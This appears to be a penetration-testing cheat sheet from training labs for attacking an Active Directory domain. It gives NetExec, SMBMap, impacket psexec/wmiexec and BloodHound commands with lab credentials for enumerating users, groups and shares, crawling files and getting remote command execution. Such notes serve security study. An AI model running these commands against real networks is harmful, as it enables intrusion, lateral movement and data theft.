#### NXC - Domain User Enumeration
```
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

#### NXC - Domain Group Enumeration
```
sudo nxc ldap 172.16.5.5 -u forend -p Klmcargo2 --groups
```
Query a particular group:
```
sudo nxc ldap streamio.htb -u JDgodd -p "JDg0dd1sr3@t0r" --groups "CORE STAFF"
```

#### NXC Share Searching
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

#### SMBMap To Check Access
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```



#### Spider_plus
The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.
```
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

```
nxc SMB <IP> -u USER -p PASSWORD --spider C\$ --pattern txt
```



#### Using psexec.py
```
impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.12
```

#### Using wmiexec.py
```
impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

## Bloodhound.py
```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

